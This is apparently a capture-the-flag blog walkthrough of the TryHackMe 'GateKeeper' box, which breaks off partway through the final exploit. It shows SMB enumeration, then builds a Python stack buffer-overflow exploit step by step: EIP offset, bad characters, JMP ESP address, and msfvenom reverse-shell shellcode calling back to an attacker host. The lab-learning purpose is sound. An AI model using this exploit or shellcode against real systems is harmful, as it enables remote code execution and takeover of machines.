---
title: 'THM - GateKeeper'
author: paincakes
date: 2024-05-28 20:55:00 +0800
categories: [THM, Medium]
tags: [thm-walkthrough, binary-exploitation, buffer-overflow]
---


![Box-Info](https://paincakes.sirv.com/Images/THM/info.jpeg)


# Summary
The Gatekeeper box on TryHackMe was an interesting intermediate-level Windows machine. The initial key was exploiting a buffer overflow vulnerability to gain that initial foothold on the system.

After obtaining user-level access through the buffer overflow exploit, the next step was to dump and decrypt the Mozilla Firefox credentials stored on the box. This allowed us to escalate our privileges all the way up to the system administrator level.

This challenge involved a combination of binary exploitation to achieve initial access, followed by credential harvesting and privilege escalation to reach the highest level of control on the target system.

## NMAP Scanning

As usual the `nmap` scan for the given IP address,

```
# nmap -sCV -T4 -Pn 10.10.206.3 -oN nmap.out
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 18:46 +0545
Nmap scan report for 10.10.206.3
Host is up (0.21s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
135/tcp   open     msrpc       Microsoft Windows RPC
139/tcp   open     netbios-ssn Windows 7 Professional 7601 Service Pack 1 netbios-ssn
1021/tcp  filtered exp1
31337/tcp open     Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open     msrpc       Microsoft Windows RPC
49153/tcp open     msrpc       Microsoft Windows RPC
49154/tcp open     msrpc       Microsoft Windows RPC
49155/tcp open     msrpc       Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.94SVN%I=7%D=4/17%Time=661FC854%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\
SF:x20Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:n
SF:m@nm>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-
SF:ID:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-F
SF:orwards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Conta
SF:ct:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHell
SF:o\x20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(
SF:HTTPOptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!
SF:\n")%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x
SF:20\r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x
SF:20\x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSS
SF:essionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(
SF:FourOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2
SF:ebak\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x0
SF:1default!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!
SF:\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:f3:31:27:3b:01 (unknown)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-17T09:04:46-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-04-17T13:04:46
|_  start_date: 2024-04-17T13:02:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 194.32 seconds

```

Analyzing the `nmap` result, 

-  Port 139 is open - SMB Service is running in this machine.
- Port 31337 is open  - Running service named Elite *seems interesting*
## SMB Enumeration

Lets start with `smb` enumeration, as always check for **anonymous/guest** authentication to see if we can access any share. In our case, we can access the **Users** share using the guest authentication.

```
# crackmapexec smb 10.10.206.3 -u 'guest' -p '' --shares
SMB         10.10.206.3     445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
SMB         10.10.206.3     445    GATEKEEPER       [+] gatekeeper\guest: 
SMB         10.10.206.3     445    GATEKEEPER       [+] Enumerated shares
SMB         10.10.206.3     445    GATEKEEPER       Share           Permissions     Remark
SMB         10.10.206.3     445    GATEKEEPER       -----           -----------     ------
SMB         10.10.206.3     445    GATEKEEPER       ADMIN$                          Remote Admin
SMB         10.10.206.3     445    GATEKEEPER       C$                              Default share
SMB         10.10.206.3     445    GATEKEEPER       IPC$                            Remote IPC
SMB         10.10.206.3     445    GATEKEEPER       Users           READ  
```

Accessing the content of **Users** share using `smbclient` tool, We can find a `gatekeeper.exe` binary in the remote share. Lets download the file for further analysis.

```
# smbclient '\\10.10.206.3\Users' -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri May 15 07:42:08 2020
  ..                                 DR        0  Fri May 15 07:42:08 2020
  Default                           DHR        0  Tue Jul 14 12:52:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 10:39:24 2009
  Share                               D        0  Fri May 15 07:43:07 2020

		7863807 blocks of size 4096. 3973568 blocks available
smb: \> cd Share
smb: \Share\> dir
  .                                   D        0  Fri May 15 07:43:07 2020
  ..                                  D        0  Fri May 15 07:43:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 11:12:17 2020

		7863807 blocks of size 4096. 3973129 blocks available
smb: \Share\> mget gatekeeper.exe
Get file gatekeeper.exe? y
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (9.5 KiloBytes/sec) (average 9.5 KiloBytes/sec)
smb: \Share\> 

```
## Binary Enumeration

Since this a `.exe` binary, it wont work on Linux. Let's get the file into our Windows Machine using `python`. 

```
# python3 -m http.server 9000                                                                                  
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```

Run the program on the Local Windows Machine. 

![Gatekeeper](https://paincakes.sirv.com/Images/THM/2.png)

Use Linux to communicate to the application which runs at port 31337.

```
# nc -v 192.168.10.64 31337
192.168.10.64: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.10.64] 31337 (?) open
yo?
Hello yo?!!!
HELLLLLO
Hello HELLLLLO!!!

```

We get some information about bytes received and byte sent in the application.

![Gatekeeper](https://paincakes.sirv.com/Images/THM/3.png)

### Buffer Overflow?

Now let's check if the number bytes required to crash the program, use `python` script to generate the large number of bytes which we can send to the application.

```
# python3
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print ("A" * 1000)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>>> 
```

Lets send the 1000 number of "A" and see what happens.

```
# nc -v 192.168.10.64 31337
192.168.10.64: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.10.64] 31337 (?) open
hello
Hello hello!!!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

The program crashed, which means the exact offset to manipulate the EIP register is somewhere between 1-1000 bytes.

## Setting Up Immunity Debugger

Download the immunity debugger from the link [here](https://www.immunityinc.com/products/debugger/).

I was using Windows 10 (64bit) and it was working fine for this challenge. Make sure that `python` is not installed on the Windows before installing Immunity Debugger as it will automatically download the compatible `python` version required by it.

Now open both the application (Gatekeeper and Immunity Debugger) as Administrator. Now on the Immunity Debugger, Click on File then Attach. There should be a Gatekeeper.exe process on list, select the process and click attach. 

![Gatekeeper](https://paincakes.sirv.com/Images/THM/4.png)

After attaching the Gatekeeper.exe process, initially it will be in the paused state. Click on the run button on the top side of the application.

![Gatekeeper](https://paincakes.sirv.com/Images/THM/5.png)

Now we will need to configure `mona` script in the Immunity Debugger, For that Download the `mona` script from [here](https://github.com/corelan/mona). After downloading the `mona` script, copy the `python` file to `C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands`. 

We can run `mona` command in the Immunity Debugger at the bottom side input box.

Use `!mona help` to confirm if the `mona` script is working or not.
## Building Exploit

This is the basic skeleton python script used for buffer overflow exploitation. We will be modifying the script as needed by the application in further process. 

```
#!/bin/python

import sys
import socket

buffer = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.10.64", 31337))
    s.send((buffer + b"\r\n"))
    s.close()

except Exception as e:
    print("Error:", e)
    sys.exit()

```

After running the script, Check on the Immunity Debugger, The EIP now will be filled with "424242" which are byte versions of "A" which we sent through the script.

![Gatekeeper](https://paincakes.sirv.com/Images/THM/6.png)

### Finding Exact Offset
Now our goal is to find the exact offset where the buffer overflow will occur, so that we can control the value of EIP register. For that we will use `patter_create.rb` script and generate pattern of length 1000 which we will send to the application. 

```
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

```

Just copy the output of the script and paste it in our `python` exploit script replacing the **buffer** value. Attach the gatekeeper.exe process again into the immunity debugger (you will be needing to this multiple times as the application will be crashing more on further steps).

![Gatekeeper](https://paincakes.sirv.com/Images/THM/8.png)

Now copy the copy the value of the EIP register from the Immunity Debugger. We will be using that value in the `patter_offset.rb` script to find the exact offset for the gatekeeper application.

```
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 39654138
[*] Exact match at offset 146
```

We found the offset for the application, Now we will need to tweak our `python` exploit a little bit so that now the EIP register's value will be "42424242", which is byte format of four "B". 

```
#!/bin/python

import sys
import socket

buffer = b"A" * 146 + b"B" * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.10.64", 31337))
    s.send((buffer + b"\r\n"))
    s.close()

except Exception as e:
    print("Error:", e)
    sys.exit()
```

Now after running our python exploit, We can see that there is "42424242" set for the value of EIP register, which means we can successfully control the EIP register now.

![Gatekeeper](https://paincakes.sirv.com/Images/THM/9.png)

### Finding Bad Chars

Before generating the shellcode for catching revershell, we will need to find possible bad characters which might affect our shellcode. Since the shellcode will be generated in bytes format we don't want certain bad characters to affect our exploit. 

For finding the bad characters, just copy the badchars list from below code. `x00` will be the default bad character, its also called null byte. 

```
#!/bin/python

import sys
import socket


badchars = (
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# 0x080414c3
buffer = b"A" * 146 + b"B" * 4 + badchars

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.10.64", 31337))
    s.send((buffer + b"\r\n"))
    s.close()

except Exception as e:
    print("Error:", e)
    sys.exit()
```

Attach the gatekeeper.exe process to immunity debugger and after executing the `python` script, right click on the **ESP** register and then follow the dump.

![Gatekeeper](https://paincakes.sirv.com/Images/THM/10.png)

In the bottom left window, you will see the bad character list being displayed serially. Now we will have to check if there are any abnormal or missing character from the bad character list we sent, and it is really tough eye test. If you happen to miss even one bad character, the shellcode may not work as it should be.

![Gatekeeper](https://paincakes.sirv.com/Images/THM/11.png)

After analyzing the dump, we can see that the "0A" character is missing from the list, aside from that everything seems to be normal. So the bad characters are **/x00** and **/x0A**.

### JMP ESP

We will have our shellcode on the stack, and we need to move to that address without specifying the shellcode hardcoded address directly. We can use the JMP instruction, to jump to the stack, and stack top is pointed to by the ESP register.

So we **overwrite the return address** with the address of this “JMP ESP” instruction, and when the return address executes this instruction, it will return to the stack.

Use `nasm_shell` tool to generate hex strings of JMP ESP instruction.

```
# /usr/bin/msf-nasm_shell
nasm > JMP ESP
00000000  FFE4              jmp esp
nasm > 

```

Now we are going to identify the JMP ESP, which is crucial because it represents the pointer value and will be essential for using your Shellcode. We will use the `mona` module to find the address for JMP ESP.

```
!mona find -s "\xff\xe4" -m gatekeeper.exe
```

The `-m` switch represents the module that you're trying to find the JMP ESP for.

![Gatekeeper](https://paincakes.sirv.com/Images/THM/14.png)

We get two address with JMP ESP instruction, also its important to choose the address with most of the protection set to "False".

### Generating Shell Code

Now we have address of JMP ESP (0x080414c3), which we will now send to the EIP register value, so that our shellcode will be executed.

Modify the `python` script, like shown in in the code snippet below. Also, make sure that the JMP ESP pointer address which we found earlier is written in inverse order, because it is 32bit application which will use little-endian system.

```
#!/bin/python

import sys
import socket


shellcode = ()

# 0x080414c3
buffer = b"A" * 146 + b"\xc3\x14\x04\x08" + b"\x90" * 32 + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.10.64", 31337))
    s.send((badchars + b"\r\n"))
    s.close()

except Exception as e:
    print("Error:", e)
    sys.exit()

```

Now for generating the shellcode we will use `msfvenom` tool.

```
# msfvenom -p windows/shell_reverse_tcp LHOST=10.17.28.213 LPORT=4545 -b "\x00\x0A" -f python -e x86/shikata_ga_nai
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of python file: 1887 bytes
buf =  b""
buf += b"\xb8\xf2\xce\x81\x9a\xda\xcb\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x59\x31\x45\x14\x83\xed\xfc\x03\x45"
buf += b"\x10\x10\x3b\x7d\x72\x5b\xc4\x7e\x83\x03\xf4\xac"
buf += b"\xe7\x48\xa4\x60\x61\xab\xc2\xd3\x7d\xb8\x87\xc7"
buf += b"\xf6\xcc\x0f\xe7\xbf\x7a\x76\xc6\x40\x4b\xb6\x84"
buf += b"\x83\xca\x4a\xd7\xd7\x2c\x72\x18\x2a\x2d\xb3\xee"
buf += b"\x40\xc2\x69\xa6\x21\x4e\x9e\xc3\x74\x52\x9f\x03"
buf += b"\xf3\xea\xe7\x26\xc4\x9e\x5b\x28\x15\x0e\xef\x72"
buf += b"\xb5\xaf\x3c\x09\xfd\xb7\x47\xc7\x8a\xfb\x0e\x53"
buf += b"\x46\x88\xa0\x9c\xa6\x58\xf3\xa2\x05\xa5\x3b\x2f"
buf += b"\x57\xe2\xfc\xd0\x22\x18\xff\x6d\x35\xdb\x7d\xaa"
buf += b"\xb0\xfb\x26\x39\x62\xdf\xd7\xee\xf5\x94\xd4\x5b"
buf += b"\x71\xf2\xf8\x5a\x56\x89\x05\xd6\x59\x5d\x8c\xac"
buf += b"\x7d\x79\xd4\x77\x1f\xd8\xb0\xd6\x20\x3a\x1c\x86"
buf += b"\x84\x31\x8f\xd1\xb9\xba\x4f\xde\xe7\x2c\x83\x13"
buf += b"\x18\xac\x8b\x24\x6b\x9e\x14\x9f\xe3\x92\xdd\x39"
buf += b"\xf3\xa3\xca\xb9\x2b\x0b\x9a\x47\xcc\x6b\xb2\x83"
buf += b"\x98\x3b\xac\x22\xa1\xd0\x2c\xca\x74\x4c\x27\x5c"
buf += b"\x7d\x81\x2b\x49\xe9\xa3\x53\x60\x2b\x2a\xb5\xd2"
buf += b"\xfb\x7c\x6a\x93\xab\x3c\xda\x7b\xa6\xb3\x05\x9b"
buf += b"\xc9\x1e\x2e\x36\x26\xf6\x06\xaf\xdf\x53\xdc\x4e"
buf += b"\x1f\x4e\x98\x51\xab\x7a\x5c\x1f\x5c\x0f\x4e\x48"
buf += b"\x3b\xef\x8e\x89\xae\xef\xe4\x8d\x78\xb8\x90\x8f"
buf += b"\x5d\x8e\x3e\x6f\x88\x8d\x39\x8f\x4d\xa7\x32\xa6"
buf += b"\xdb\x87\x2c\xc7\x0b\x07\xad\x91\x41\x07\xc5\x45"
buf += b"\x32\x54\xf0\x89\xef\xc9\xa9\x1f\x10\xbb\x1e\xb7"
buf += b"\x78\x41\x78\xff\x26\xba\xaf\x83\x21\x44\x2d\xac"
buf += b"\x89\x2c\xcd\xec\x29\xac\xa7\xec\x79\xc4\x3c\xc2"
buf += b"\x76\x24\xbc\xc9\xde\x2c\x37\x9c\xad\xcd\x48\xb5"
buf += b"\x70\x53\x48\x3a\xa9\x64\x33\x33\x4e\x85\xc4\x5d"
buf += b"\x2b\x86\xc4\x61\x4d\xbb\x12\x58\x3b\xfa\xa6\xdf"
buf += b"\x34\x49\x8a\x76\xdf\xb1\x98\x89\xca"

```

Copy the output and add it in our `python` script.

```
#!/bin/python

import sys
import socket


buf =  b""
buf += b"\xb8\xf2\xce\x81\x9a\xda\xcb\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x59\x31\x45\x14\x83\xed\xfc\x03\x45"
buf += b"\x10\x10\x3b\x7d\x72\x5b\xc4\x7e\x83\x03\xf4\xac"
buf += b"\xe7\x48\xa4\x60\x61\xab\xc2\xd3\x7d\xb8\x87\xc7"
buf += b"\xf6\xcc\x0f\xe7\xbf\x7a\x76\xc6\x40\x4b\xb6\x84"
buf += b"\x83\xca\x4a\xd7\xd7\x2c\x72\x18\x2a\x2d\xb3\xee"
buf += b"\x40\xc2\x69\xa6\x21\x4e\x9e\xc3\x74\x52\x9f\x03"
buf += b"\xf3\xea\xe7\x26\xc4\x9e\x5b\x28\x15\x0e\xef\x72"
buf += b"\xb5\xaf\x3c\x09\xfd\xb7\x47\xc7\x8a\xfb\x0e\x53"
buf += b"\x46\x88\xa0\x9c\xa6\x58\xf3\xa2\x05\xa5\x3b\x2f"
buf += b"\x57\xe2\xfc\xd0\x22\x18\xff\x6d\x35\xdb\x7d\xaa"
buf += b"\xb0\xfb\x26\x39\x62\xdf\xd7\xee\xf5\x94\xd4\x5b"
buf += b"\x71\xf2\xf8\x5a\x56\x89\x05\xd6\x59\x5d\x8c\xac"
buf += b"\x7d\x79\xd4\x77\x1f\xd8\xb0\xd6\x20\x3a\x1c\x86"
buf += b"\x84\x31\x8f\xd1\xb9\xba\x4f\xde\xe7\x2c\x83\x13"
buf += b"\x18\xac\x8b\x24\x6b\x9e\x14\x9f\xe3\x92\xdd\x39"
